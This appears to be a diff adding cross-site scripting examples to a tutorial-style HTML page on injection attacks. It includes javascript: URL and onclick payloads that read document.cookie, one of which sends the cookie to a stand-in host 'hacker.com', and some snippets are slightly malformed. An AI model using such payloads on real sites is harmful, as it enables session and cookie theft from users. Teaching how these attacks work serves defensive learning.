@@ -175,12 +175,28 @@ print ("Thanks for your interest in %s",name);
 <p>
 –The attacker injects code on the server that when downloaded to the client allows further mischief.<br>
 –As before, but its embedded in a message on the server. Such as a blog or social networking message site.</p>
+<p>There are other ways to insert Javascript:</p>
 
-
-
-
-
-
+```html
+<img src=“javascript:alert(document.cookie);”>
+<a href="javascript: alert(document.cookie);">Click here to win</a>
+<input type=“button” value=“submit” onclick="parent.location.reload(‘http://hacker.com?c’=encodeURI(document.cookie));">
+```
+<br><p><b>Inline Javascript:<b></p>
+  
+  ```html
+<html>
+  <body>
+    <h3>XSS version 2</h3>
+      <form>
+        First Name<input type="text" name="firstname" />
+        <br>
+        Second Name<input type="text" name="secondname" />
+        <br>
+        <input type="BUTTON" VALUE="Submit" onclick="alert(document.cookie)"/>
+  </body>
+</html>
+```
 
 
 
